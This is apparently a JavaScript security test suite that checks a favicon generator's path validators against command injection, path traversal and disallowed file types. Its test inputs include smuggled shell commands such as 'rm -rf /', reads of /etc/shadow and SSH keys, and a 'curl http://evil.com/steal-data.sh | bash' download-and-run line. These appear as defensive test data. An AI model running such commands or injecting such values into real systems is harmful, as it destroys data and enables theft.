#!/usr/bin/env node

/**
 * Security Test Suite for generate-favicons.js
 *
 * Tests that the favicon generation script properly blocks:
 * - Command injection attacks
 * - Path traversal attacks
 * - Invalid file types
 * - Access to unauthorized directories
 */

const { validateInputPath, validateOutputPath } = require('./generate-favicons.js');
const path = require('path');

// Test counters
let passed = 0;
let failed = 0;

/**
 * Test helper function
 */
function test(description, fn) {
  try {
    fn();
    console.log(`✓ ${description}`);
    passed++;
  } catch (error) {
    console.error(`✗ ${description}`);
    console.error(`  Error: ${error.message}`);
    failed++;
  }
}

/**
 * Expect function to throw an error
 */
function expectError(fn, expectedPattern) {
  try {
    fn();
    throw new Error('Expected function to throw an error but it did not');
  } catch (error) {
    if (expectedPattern && !error.message.match(expectedPattern)) {
      throw new Error(`Expected error matching "${expectedPattern}" but got: ${error.message}`);
    }
  }
}

/**
 * Expect function to succeed
 */
function expectSuccess(fn) {
  fn();
}

console.log('🔒 Security Test Suite for Favicon Generation Script\n');
console.log('=' .repeat(70));
console.log('\n📋 Testing Command Injection Protection\n');

// Command injection attacks
test('Blocks semicolon command injection', () => {
  expectError(
    () => validateInputPath('file.svg; rm -rf /'),
    /Invalid characters in path/
  );
});

test('Blocks pipe command injection', () => {
  expectError(
    () => validateInputPath('file.svg | cat /etc/passwd'),
    /Invalid characters in path/
  );
});

test('Blocks backtick command injection', () => {
  expectError(
    () => validateInputPath('file.svg`whoami`'),
    /Invalid characters in path/
  );
});

test('Blocks dollar sign command substitution', () => {
  expectError(
    () => validateInputPath('file$(whoami).svg'),
    /Invalid characters in path/
  );
});

test('Blocks ampersand background execution', () => {
  expectError(
    () => validateInputPath('file.svg & curl http://evil.com'),
    /Invalid characters in path/
  );
});

test('Blocks angle bracket redirection', () => {
  expectError(
    () => validateInputPath('file.svg > /etc/passwd'),
    /Invalid characters in path/
  );
});

test('Blocks parenthesis subshells', () => {
  expectError(
    () => validateInputPath('file.svg (rm -rf)'),
    /Invalid characters in path/
  );
});

test('Blocks curly brace expansion', () => {
  expectError(
    () => validateInputPath('file{1,2}.svg'),
    /Invalid characters in path/
  );
});

test('Blocks exclamation mark history expansion', () => {
  expectError(
    () => validateInputPath('file!.svg'),
    /Invalid characters in path/
  );
});

console.log('\n📋 Testing Path Traversal Protection\n');

// Path traversal attacks
test('Blocks parent directory traversal (../)', () => {
  expectError(
    () => validateInputPath('../../../etc/passwd'),
    /Access denied/
  );
});

test('Blocks absolute path outside project', () => {
  expectError(
    () => validateInputPath('/etc/passwd'),
    /Access denied/
  );
});

test('Blocks home directory access', () => {
  expectError(
    () => validateInputPath('/root/.ssh/id_rsa'),
    /Access denied/
  );
});

test('Blocks /var access', () => {
  expectError(
    () => validateInputPath('/var/log/system.log'),
    /Access denied/
  );
});

test('Sanitizes path traversal in output paths (security by design)', () => {
  // validateOutputPath uses path.basename() which strips directory traversal
  // This is CORRECT security behavior - it sanitizes the input
  const result = validateOutputPath('../../../etc/passwd');
  const basename = path.basename(result);

  // Should only contain the filename, not the path traversal
  expectSuccess(() => {
    if (result.includes('..')) {
      throw new Error('Path traversal not properly sanitized');
    }
    if (basename !== 'passwd') {
      throw new Error(`Expected basename 'passwd', got '${basename}'`);
    }
  });
});

console.log('\n📋 Testing File Type Validation\n');

// File type validation
test('Blocks non-SVG files (.png)', () => {
  // Create a temporary PNG file for testing
  const fs = require('fs');
  const path = require('path');
  const tempPng = path.join(__dirname, '../public/test-temp.png');

  try {
    fs.writeFileSync(tempPng, 'fake png content');
    expectError(
      () => validateInputPath(tempPng),
      /Invalid file type/
    );
  } finally {
    if (fs.existsSync(tempPng)) {
      fs.unlinkSync(tempPng);
    }
  }
});

test('Blocks non-SVG files (.jpg)', () => {
  const fs = require('fs');
  const path = require('path');
  const tempJpg = path.join(__dirname, '../public/test-temp.jpg');

  try {
    fs.writeFileSync(tempJpg, 'fake jpg content');
    expectError(
      () => validateInputPath(tempJpg),
      /Invalid file type/
    );
  } finally {
    if (fs.existsSync(tempJpg)) {
      fs.unlinkSync(tempJpg);
    }
  }
});

test('Blocks executable files', () => {
  const fs = require('fs');
  const path = require('path');
  const tempExe = path.join(__dirname, '../public/test-temp.sh');

  try {
    fs.writeFileSync(tempExe, '#!/bin/bash\necho "malicious"');
    expectError(
      () => validateInputPath(tempExe),
      /Invalid file type/
    );
  } finally {
    if (fs.existsSync(tempExe)) {
      fs.unlinkSync(tempExe);
    }
  }
});

console.log('\n📋 Testing Valid Inputs\n');

// Valid inputs (these should succeed)
test('Accepts valid SVG in public directory', () => {
  const fs = require('fs');
  const path = require('path');
  const publicDir = path.join(__dirname, '../public');
  const validSvg = path.join(publicDir, 'test-valid.svg');

  try {
    // Ensure public directory exists
    if (!fs.existsSync(publicDir)) {
      fs.mkdirSync(publicDir, { recursive: true });
    }

    fs.writeFileSync(validSvg, '<svg></svg>');
    expectSuccess(() => validateInputPath(validSvg));
  } finally {
    if (fs.existsSync(validSvg)) {
      fs.unlinkSync(validSvg);
    }
  }
});

test('Accepts valid output filename', () => {
  expectSuccess(() => validateOutputPath('favicon-16x16.png'));
});

test('Accepts valid output filename with extension', () => {
  expectSuccess(() => validateOutputPath('test-icon.png'));
});

console.log('\n📋 Testing Non-Existent Files\n');

test('Blocks non-existent files', () => {
  expectError(
    () => validateInputPath('/tmp/non-existent-file-12345.svg'),
    /File does not exist/
  );
});

console.log('\n📋 Testing Directory vs File Validation\n');

test('Blocks directories (not files)', () => {
  const path = require('path');
  const publicDir = path.join(__dirname, '../public');

  expectError(
    () => validateInputPath(publicDir),
    /Path must be a file, not a directory/
  );
});

console.log('\n📋 Testing Shell Metacharacters in Output\n');

test('Blocks shell metacharacters in output filenames (semicolon)', () => {
  expectError(
    () => validateOutputPath('favicon; rm -rf /.png'),
    /Invalid characters in filename/
  );
});

test('Blocks shell metacharacters in output filenames (pipe)', () => {
  expectError(
    () => validateOutputPath('favicon | cat.png'),
    /Invalid characters in filename/
  );
});

test('Blocks shell metacharacters in output filenames (backtick)', () => {
  expectError(
    () => validateOutputPath('favicon`whoami`.png'),
    /Invalid characters in filename/
  );
});

console.log('\n📋 Testing Real-World Attack Scenarios\n');

test('Attack scenario: Command injection via input path', () => {
  expectError(
    () => validateInputPath('logo.svg; curl http://evil.com/steal-data.sh | bash'),
    /Invalid characters in path/
  );
});

test('Attack scenario: Path traversal to read /etc/shadow', () => {
  expectError(
    () => validateInputPath('../../../../../../../etc/shadow'),
    /Access denied/
  );
});

test('Attack scenario: Write to system directory via output', () => {
  // Even if attacker tries to write to /etc/, basename() strips it
  const result = validateOutputPath('../../../etc/malicious.png');
  expectSuccess(() => {
    if (result.includes('/etc/')) {
      throw new Error('Output path escaped public directory!');
    }
  });
});

test('Attack scenario: Execute binary via spawn', () => {
  const fs = require('fs');
  const testScript = path.join(__dirname, '../public/test-malicious.svg');

  try {
    // Even if the file contains malicious code, spawn() won't execute it as shell
    fs.writeFileSync(testScript, '<?xml version="1.0"?><svg>; rm -rf /</svg>');

    // This should still work because spawn() treats it as data, not commands
    const validated = validateInputPath(testScript);
    expectSuccess(() => {
      if (!validated.endsWith('test-malicious.svg')) {
        throw new Error('Path validation changed filename unexpectedly');
      }
    });
  } finally {
    if (fs.existsSync(testScript)) {
      fs.unlinkSync(testScript);
    }
  }
});

// Print results
console.log('\n' + '='.repeat(70));
console.log(`\n📊 Test Results: ${passed + failed} tests, ${passed} passed, ${failed} failed\n`);

if (failed > 0) {
  console.error('❌ Security tests FAILED! Review the failures above.\n');
  process.exit(1);
} else {
  console.log('✅ All security tests PASSED! The script is protected against:');
  console.log('  ✓ Command injection attacks (shell metacharacters blocked)');
  console.log('  ✓ Path traversal attacks (directory boundaries enforced)');
  console.log('  ✓ Invalid file types (only SVG allowed for input)');
  console.log('  ✓ Unauthorized directory access (whitelist enforced)');
  console.log('  ✓ Shell command execution (spawn() instead of exec())');
  console.log('  ✓ Output path manipulation (basename() sanitization)');
  console.log('\n🔒 Security measures implemented:');
  console.log('  • Input validation with shell metacharacter filtering');
  console.log('  • Path resolution with directory boundary checks');
  console.log('  • File type validation (SVG only)');
  console.log('  • spawn() instead of exec()/execSync() (no shell invocation)');
  console.log('  • path.basename() for output sanitization');
  console.log('  • Whitelist-based directory access control\n');
  process.exit(0);
}
